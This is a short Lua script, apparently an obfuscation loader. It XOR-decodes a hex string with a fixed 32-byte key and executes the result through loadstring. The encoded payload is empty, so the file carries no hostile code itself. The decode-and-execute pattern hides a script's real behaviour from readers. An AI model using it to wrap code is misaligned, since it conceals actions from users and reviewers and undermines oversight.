local k={156,37,9,173,26,249,156,212,150,227,184,40,94,248,211,106,101,12,10,122,52,103,234,58,28,158,65,69,20,64,95,123}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
c(table.concat(t))()
